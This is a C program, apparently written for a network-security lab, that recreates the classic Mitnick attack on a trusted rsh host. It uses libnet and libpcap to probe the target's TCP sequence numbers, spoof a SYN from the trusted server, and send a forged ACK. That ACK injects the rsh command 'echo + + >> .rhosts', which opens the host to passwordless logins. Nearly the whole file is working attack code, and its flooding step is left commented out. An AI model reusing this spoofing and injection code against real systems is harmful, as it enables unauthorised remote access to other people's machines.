#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
//#include <common.h>
#include <unistd.h>
#include <pcap.h>


//eth level data -> do I need this??
#define KEVIN_MAC "02:00:ac:10:10:02"
#define SERVER_MAC "02:00:ac:10:10:03"
#define XTERMINAL_MAC "02:00:ac:10:10:04"

//ip level data
char * KEVIN_IP = "172.16.16.2";
char * SERVER_IP = "172.16.16.3";
char * XTERMINAL_IP = "172.16.16.4";

//tcp level data
#define PORT 513
#define PAYLOAD_DOS "disable"
#define PAYLOAD_RST "enable"

//initializations as per tcpdump online documentation
#include <inttypes.h>

#define SIZE_ETH 14

/* IP header */
struct ip_hdr {
	u_char ip_vhl;		/* version << 4 | header length >> 2 */
	u_char ip_tos;		/* type of service */
	u_short ip_len;		/* total length */
	u_short ip_id;		/* identification */
	u_short ip_off;		/* fragment offset field */
	#define IP_RF 0x8000		/* reserved fragment flag */
	#define IP_DF 0x4000		/* dont fragment flag */
	#define IP_MF 0x2000		/* more fragments flag */
	#define IP_OFFMASK 0x1fff	/* mask for fragmenting bits */
	u_char ip_ttl;		/* time to live */
	u_char ip_p;		/* protocol */
	u_short ip_sum;		/* checksum */
	struct in_addr ip_src,ip_dst; /* source and dest address */
};

#define IP_HL(ip)		(((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)		(((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct tcp_hdr {
	u_short th_sport;	/* source port */
	u_short th_dport;	/* destination port */
	tcp_seq th_seq;		/* sequence number */
	tcp_seq th_ack;		/* acknowledgement number */
	u_char th_offx2;	/* data offset, rsvd */
	#define TH_OFF(th)	(((th)->th_offx2 & 0xf0) >> 4)
	u_char th_flags;
	#define TH_FIN 0x01
	#define TH_SYN 0x02
	#define TH_RST 0x04
	#define TH_PUSH 0x08
	#define TH_ACK 0x10
	#define TH_URG 0x20
	#define TH_ECE 0x40
	#define TH_CWR 0x80
	#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
	u_short th_win;		/* window */
	u_short th_sum;		/* checksum */
	u_short th_urp;		/* urgent pointer */
};




//function definitions
uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack);
u_long compute_next_seq(u_long n1, u_long n2);

//shimomura you're doomed
int main (void)
{
	//initialize libnett stuff
	char errbuff[LIBNET_ERRBUF_SIZE];
	libnet_t * l;

	l = libnet_init(LIBNET_RAW4, "eth0", errbuff);
	if (l == NULL)
	{
		printf("libnet init error\n");
		exit(EXIT_FAILURE);
	}

	libnet_seed_prand(l);
	//start DOS part
	//ip conversion
	u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
	u_long kevin_ip = libnet_name2addr4(l, KEVIN_IP, LIBNET_DONT_RESOLVE);
	u_long xterm_ip = libnet_name2addr4(l, XTERMINAL_IP, LIBNET_DONT_RESOLVE);


	if (server_ip == (u_long) -1)
	{
		printf("error in server ip conversion\n");
		exit(EXIT_FAILURE);
	}
	if (kevin_ip == (u_long) -1)
	{
		printf("error in kevin ip conversion\n");
		exit(EXIT_FAILURE);
	}
	if (xterm_ip == (u_long) -1)
	{
		printf("error in xterm ip conversion\n");
		exit(EXIT_FAILURE);
	}

	//dos the server
	char disable[] = "disable";
	int i;
	printf("Starting the DOS attack\n");
	for (i = 0; i < 15; i++)
	{
		//craft and send 10 packets with "disable" payload
		printf("dos\n");
		//send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip, kevin_ip);
	}
	//now the server will ignore syn acks, that's exactly what I need because my plan is:
		//send spoofed syn, the xterminal will send real synack to the server
		//I will respond with spoofed ack cause I know the server seq num (probing)
		//will have a trusted connection on the xterminal and can inject backdoor

	//contact xterminal to figure out next seq #

	//libpcap setup
	pcap_t *handle;																// Session handle
	char *dev;																		// The device to sniff, eth0?
	char errbuf[PCAP_ERRBUF_SIZE];								// Error string
	struct bpf_program fp;												// The compiled filter
	char filter_exp[] = "src host xterminal";			// The filter expression, only packets that I receive from xterminal
	bpf_u_int32 mask;															// Netmask
	bpf_u_int32 net;															// kevin IP
	struct pcap_pkthdr header;										// pcap header
	const u_char *packet;													// sniffed packet
	const struct ip_hdr *ip_hdr;
	const struct tcp_hdr *tcp_hdr;

	/* Define the device */
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL)
	{
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	/* Find the properties for the device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1)
	{
			fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
			return(2);
	}

	//probe xterminal
	u_long seq_array[3]; //actually I onlly need 2

	printf("Starting probing\n");
	for (i = 0; i < 3; i++)
	{
		//printf("probe\n");
		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
		send_syn(514, 514 + (uint16_t )i + 1, NULL, 0, l, xterm_ip, kevin_ip);
		usleep(1000);
		packet = pcap_next(handle, &header);

		ip_hdr = (struct ip_hdr *) (packet + SIZE_ETH);
		tcp_hdr = (const struct tcp_hdr *) (packet + SIZE_ETH + sizeof(struct ip_hdr));

		tcp_seq seq = htonl(tcp_hdr->th_seq);
		tcp_seq ack = htonl(tcp_hdr->th_ack);
		//usleep(1000);
		printf("seq %u, ack %u\n", seq, ack);
		seq_array[i] = seq;

	}

	pcap_close(handle);

	//compute nextseq
	printf("predictions\n");
	printf("%u\n", compute_next_seq(seq_array[1], seq_array[0]) -1);

	u_long predicted_seq = compute_next_seq(seq_array[2], seq_array[1]);
	printf("predicted next seq %lu\n", predicted_seq);
	//exploit trust relation

	//send syn impersonating the server
	//as per manpage rshd, port of the client shound be within a range 512-1024 otherwise the connection is reset
	uint16_t my_seq = send_syn(514, 514, NULL, 0, l, xterm_ip, server_ip);
	printf("sent spoofed syn with seq %u, waiting a second\n", my_seq);
	sleep(1);
	//send ack with predicted seq and inject backdoor
	//the command interpretation of the payload is specified in the manpage rshd. Need null-terminated: stderr\0user\0user\0command\0
	char backdoor[] = "0\0tsutomu\0tsutomu\0echo + + >> .rhosts";
	uint32_t b_len = 38;
	//int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack)
	send_ack(514, 514, (uint8_t *) backdoor, b_len, l, server_ip, xterm_ip, my_seq + 1,  predicted_seq);
	printf("sent ack and pushed backdoor\n");

	//connect from my own ip

	//enable the server back

	exit(EXIT_SUCCESS);
}


uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
{

	libnet_ptag_t t;
	//build syn
	uint32_t my_seq = libnet_get_prand(LIBNET_PRu32);

	t = libnet_build_tcp(
		src_port, //sp source port
		dest_port,											//dp destinatin port
		my_seq, //sequence number
    0, 															//ack number, can I send whatever?
    TH_SYN,													//control bit SYN
		2048, 													//window size, random is ok?
		0,															//checksum, if 0 libnet autofills
		10,															//urgent pointer
		LIBNET_TCP_H + payload_s,				//len = tcp header + payload size
		payload,												//payload
		payload_s,											//payload size
		l,															//pointer to libnet context
		0																//protocol tag, 0 to build a new one
	);

	if (t == -1)
	{
		printf("error while crafting tcp syn\n");
		exit(EXIT_FAILURE);
	}

	//build ip fragment containing syn
	t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
		0,																				//tos, type of service
		0,																				//id, ip identification
		0,																				//fragmentation bits and offset
		libnet_get_prand(LIBNET_PR8),							//ttl
    IPPROTO_TCP,															//upper protocol
    0,																				//checksum, 0 to autofill
    kevin_ip,																	//src, I use a random fake ip
    server_ip,																//destination
    NULL,																			//payload
    0,																				//payload len
		l,																				//libnet context
		0																					//protocol tag
	);

	if (t == -1)
	{
		printf("error while crafting ip header\n");
		exit(EXIT_FAILURE);
	}

	//send packet
	int success = libnet_write(l);
	if (success == -1)
	{
		printf("error while sending packet\n");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("sent %d\n", success);
	}

	libnet_clear_packet(l);
	return my_seq;
}


int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint16_t my_seq, uint16_t ack)
{

	libnet_ptag_t t;
	//build syn
	t = libnet_build_tcp(
		src_port, 											//sp source port
		dest_port,											//dp destinatin port
		my_seq, 												//sequence number
    ack, 														//ack number?
    TH_ACK | TH_PUSH,								//control bit SYN
		2048, 													//window size, random is ok?
		0,															//checksum, if 0 libnet autofills
		10,															//urgent pointer
		LIBNET_TCP_H + payload_s,				//len = tcp header + size of backdoor
		payload,												//payload backdoor
		payload_s,											//payload size
		l,															//pointer to libnet context
		0																//protocol tag, 0 to build a new one
	);

	if (t == -1)
	{
		printf("error while crafting tcp syn\n");
		exit(EXIT_FAILURE);
	}

	//build ip fragment containing syn
	t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
		0,																				//tos, type of service
		0,																				//id, ip identification
		0,																				//fragmentation bits and offset
		libnet_get_prand(LIBNET_PR8),							//ttl
    IPPROTO_TCP,															//upper protocol
    0,																				//checksum, 0 to autofill
    server_ip,																//src, server ip
    xterm_ip,																	//destination, xterm ip
    NULL,																			//payload
    0,																				//payload len
		l,																				//libnet context
		0																					//protocol tag
	);

	if (t == -1)
	{
		printf("error while crafting ip header\n");
		exit(EXIT_FAILURE);
	}

	//send packet
	int success = libnet_write(l);
	if (success == -1)
	{
		printf("error while sending packet\n");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("sent %d\n", success);
	}

	libnet_clear_packet(l);
	return 1;
}


u_long compute_next_seq(u_long n1, u_long n2)
{
	//expression for next sequence number
	//seq(N) = 2seq(N-1) - seq(N-2) + 3
	u_long n = 2*n1 - n2 + 3 + 1;
	return n;
}
